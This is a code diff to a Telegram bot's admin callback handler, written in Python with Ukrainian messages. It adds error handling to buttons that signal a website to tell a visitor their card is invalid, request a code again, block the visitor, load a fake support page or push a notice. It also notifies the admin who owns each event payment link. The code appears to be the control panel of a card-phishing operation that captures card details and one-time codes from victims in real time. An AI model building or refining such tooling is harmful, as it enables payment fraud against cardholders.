@@ -2823,14 +2823,18 @@ async def admin_action_handler(call: types.CallbackQuery):
     
     if action == 'push':
         print(f'[DEBUG] Processing PUSH action for page_code={page_code}, ip={ip}')
+        if not page_code:
+            await call.answer("❌ Помилка: відсутній page_code для push")
+            return
+            
         import aiohttp as aiohttp_client
         async with aiohttp_client.ClientSession() as session:
             try:
                 resp = await session.post('http://127.0.0.1:8080/set_push_flag', json={'page_code': page_code, 'type': 'push'})
                 print(f'[DEBUG] Push response: {resp.status}')
                 
-                # Надсилаємо красиве повідомлення адміну, чия це посилання
-                if page_code:
+                if resp.status == 200:
+                    # Надсилаємо красиве повідомлення адміну, чия це посилання
                     admin_user_id = None
                     c = conn.cursor()
                     c.execute('SELECT user_id FROM event_links WHERE event_code=?', (page_code,))
@@ -2848,82 +2852,121 @@ async def admin_action_handler(call: types.CallbackQuery):
                         )
                         await bot.send_message(admin_user_id, push_message)
                         print(f'[DEBUG] Push message sent to admin {admin_user_id}')
+                    
+                    await call.answer("✅ Push-повідомлення встановлено на сайті")
+                else:
+                    await call.answer("❌ Помилка встановлення push-повідомлення")
                 
             except Exception as e:
                 print(f'[ERROR] Push request failed: {e}')
-        await call.answer("Push notification sent")
+                await call.answer("❌ Помилка сервера")
         return
     
     # Обробка кнопок card, block, unblock, code
     if action in ['card', 'block', 'unblock', 'code']:
         print(f'[DEBUG] Processing {action.upper()} action for ip={ip}')
+        if not ip:
+            await call.answer("❌ Помилка: відсутній IP")
+            return
+            
         import aiohttp as aiohttp_client
         async with aiohttp_client.ClientSession() as session:
             try:
                 resp = await session.post('http://127.0.0.1:8080/admin_action', json={'action': action, 'ip': ip})
                 print(f'[DEBUG] {action.upper()} response: {resp.status}')
+                
+                if resp.status == 200:
+                    if action == 'card':
+                        await call.answer("✅ Сигнал про невірну карту надіслано на сайт")
+                    elif action == 'block':
+                        await call.answer("✅ Користувач заблокований на сайті")
+                    elif action == 'unblock':
+                        await call.answer("✅ Користувач розблокований на сайті")
+                    elif action == 'code':
+                        await call.answer("✅ Код запитується на сайті")
+                else:
+                    await call.answer("❌ Помилка виконання дії")
+                    
             except Exception as e:
                 print(f'[ERROR] {action.upper()} request failed: {e}')
+                await call.answer("❌ Помилка сервера")
         
-        if action == 'card':
-            await call.answer("Сигнал на сайт: не вірна карта")
-        elif action == 'block':
-            await call.answer("Користувач заблокований")
-        elif action == 'unblock':
-            await call.answer("Користувач розблокований")
-        elif action == 'code':
-            await call.answer("Код запитується")
         print(f'[DEBUG] {action.upper()} action completed')
         return
     elif action == 'support':
         print(f'[DEBUG] Processing SUPPORT action for ip={ip}, page_code={page_code}')
+        if not ip:
+            await call.answer("❌ Помилка: відсутній IP")
+            return
+            
         import aiohttp as aiohttp_client
         async with aiohttp_client.ClientSession() as session:
             try:
                 resp = await session.post('http://127.0.0.1:8080/set_support_flag', json={'ip': ip, 'type': 'support'})
                 print(f'[DEBUG] Support response: {resp.status}')
+                
+                if resp.status == 200:
+                    # Надсилаємо красиве повідомлення про технічну підтримку
+                    if ip and page_code:  # Додаємо перевірку page_code
+                        admin_user_id = None
+                        c = conn.cursor()
+                        c.execute('SELECT user_id FROM event_links WHERE event_code=?', (page_code,))
+                        row = c.fetchone()
+                        if row:
+                            admin_user_id = row[0]
+                        
+                        if admin_user_id:
+                            admin_username = get_admin_username_by_user_id(admin_user_id)
+                            support_message = format_support_notification_message(
+                                admin_username=admin_username,
+                                name=user_name,
+                                price=event_price,
+                                currency=event_currency
+                            )
+                            await bot.send_message(admin_user_id, support_message)
+                            print(f'[DEBUG] Support message sent to admin {admin_user_id}')
+                    
+                    await call.answer("✅ Сторінка техпідтримки завантажена на сайті")
+                else:
+                    await call.answer("❌ Помилка завантаження сторінки техпідтримки")
+                    
             except Exception as e:
                 print(f'[ERROR] Support request failed: {e}')
+                await call.answer("❌ Помилка сервера")
         
-        # Надсилаємо красиве повідомлення про технічну підтримку
-        if ip and page_code:  # Додаємо перевірку page_code
-            admin_user_id = None
-            c = conn.cursor()
-            c.execute('SELECT user_id FROM event_links WHERE event_code=?', (page_code,))
-            row = c.fetchone()
-            if row:
-                admin_user_id = row[0]
-            
-            if admin_user_id:
-                admin_username = get_admin_username_by_user_id(admin_user_id)
-                support_message = format_support_notification_message(
-                    admin_username=admin_username,
-                    name=user_name,
-                    price=event_price,
-                    currency=event_currency
-                )
-                await bot.send_message(admin_user_id, support_message)
-                print(f'[DEBUG] Support message sent to admin {admin_user_id}')
-        
-        await call.answer("Включена технічна підтримка")
         print(f'[DEBUG] Support action completed')
         return
     elif action == 'text':
         print(f'[DEBUG] Processing TEXT action for ip={ip}, page_code={page_code}')
-        await call.answer("Введіть текст повідомлення:")
+        if not ip:
+            await call.answer("❌ Помилка: відсутній IP")
+            return
+            
+        await call.answer("✍️ Введіть текст повідомлення для показу на сайті:")
         user_step[call.from_user.id] = f'text_for_{ip}:{page_code}' if page_code else f'text_for_{ip}'
         print(f'[DEBUG] Text action completed, user_step set to: {user_step[call.from_user.id]}')
         return
     elif action == 'code_request_again':
         print(f'[DEBUG] Processing CODE_REQUEST_AGAIN action for code={ip}')
+        if not ip:
+            await call.answer("❌ Помилка: відсутній код")
+            return
+            
         import aiohttp as aiohttp_client
         async with aiohttp_client.ClientSession() as session:
             try:
                 resp = await session.post('http://127.0.0.1:8080/set_request_again', json={'code': ip})
                 print(f'[DEBUG] Code request again response: {resp.status}')
+                
+                if resp.status == 200:
+                    await call.answer("✅ Код запитується знову на сайті")
+                else:
+                    await call.answer("❌ Помилка повторного запиту коду")
+                    
             except Exception as e:
                 print(f'[ERROR] Code request again failed: {e}')
-        await call.answer("Код запитується знову")
+                await call.answer("❌ Помилка сервера")
+        
         print(f'[DEBUG] Code request again action completed')
         return
     
